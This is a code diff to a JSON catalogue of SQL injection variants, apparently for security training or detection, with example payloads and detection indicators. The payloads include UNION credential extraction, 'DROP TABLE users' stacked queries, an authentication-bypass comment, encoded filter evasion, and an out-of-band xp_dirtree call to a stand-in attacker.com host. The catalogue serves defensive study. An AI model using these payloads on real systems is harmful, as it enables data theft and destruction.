@@ -45,19 +45,82 @@
       "supportedApps": ["dotnet", "java", "node", "python", "go"],
       "variants": [
         {
-          "name": "Union-based",
-          "description": "Blend attacker-controlled results into a legitimate query.",
-          "example": "' UNION SELECT user, password FROM accounts --"
+          "name": "Union-based SQLi",
+          "description": "Leverages UNION to extract data from another table.",
+          "example": "1 UNION SELECT username, password FROM admin--",
+          "compatibility": "sqlite",
+          "detection": "Monitor for UNION keyword in input, schema data in responses.",
+          "indicators": "Structured results with sensitive data, UNION SELECT in logs."
         },
         {
-          "name": "Boolean blind",
-          "description": "Infer data via true/false logic when errors are hidden.",
-          "example": "' OR 1=1 --"
+          "name": "Error-based SQLi",
+          "description": "Forces error messages that leak DB structure.",
+          "example": "' OR 1=1 ORDER BY 9999--",
+          "compatibility": "sqlite",
+          "detection": "Look for SQL errors in responses and log entries with ' or --.",
+          "indicators": "500 errors, stack traces, unescaped characters."
         },
         {
-          "name": "Time-based blind",
-          "description": "Delay responses to confirm injectable parameters.",
-          "example": "' OR SLEEP(5) --"
+          "name": "Boolean-based SQLi",
+          "description": "Reveals data through true/false conditions without output.",
+          "example": "' OR 1=1--",
+          "compatibility": "sqlite",
+          "detection": "Track similar inputs with different logic, response differences.",
+          "indicators": "Patterned queries, varying response codes/sizes."
+        },
+        {
+          "name": "Time-based SQLi",
+          "description": "Uses timing to infer logical conditions with no visible output.",
+          "example": "' OR IF(1=1, SLEEP(5), 0)--",
+          "compatibility": "db-specific",
+          "detection": "Identify queries with delay functions and long response times.",
+          "indicators": "Consistent delays, inputs with SLEEP/WAITFOR."
+        },
+        {
+          "name": "Out-of-Band SQLi (OOB)",
+          "description": "Forces DB to send data to attacker via DNS/HTTP.",
+          "example": "'; EXEC xp_dirtree '\\\\attacker.com\\\\share'--",
+          "compatibility": "db-specific",
+          "detection": "Monitor outbound DNS/HTTP requests from DB server.",
+          "indicators": "External connections from DB server, use of xp_cmdshell."
+        },
+        {
+          "name": "Second-Order SQLi",
+          "description": "Malicious input saved and executed later when reused.",
+          "example": "abc'--",
+          "compatibility": "sqlite",
+          "detection": "Track flow of stored inputs, use taint analysis.",
+          "indicators": "SQL errors triggered later from stored input."
+        },
+        {
+          "name": "Stored SQLi",
+          "description": "Injection gets stored in DB and runs when displayed.",
+          "example": "'); DROP TABLE users;--",
+          "compatibility": "sqlite",
+          "detection": "Scan persistent inputs for SQL metacharacters.",
+          "indicators": "Unexpected DB changes, schema modification."
+        },
+        {
+          "name": "Piggy-Backed Queries",
+          "description": "Executes additional queries; not just data access.",
+          "example": "'; DROP TABLE users;--",
+          "compatibility": "sqlite",
+          "detection": "Check for semicolons and multiple SQL statements.",
+          "indicators": "Multiple operations in one input, data loss."
+        },
+        {
+          "name": "Inline Comment Injection",
+          "description": "Comments out remaining query to bypass logic.",
+          "example": "admin' --",
+          "compatibility": "sqlite",
+          "detection": "Look for comment characters in inputs.",
+          "indicators": "Authentication bypass, truncated queries."
+        },
+        {
+          "name": "Alternate Encodings",
+          "description": "Evades basic filters using encoded input.",
+          "example": "%27%20OR%201%3D1--",
+          "compatibility": "sqlite"
         }
       ]
     },
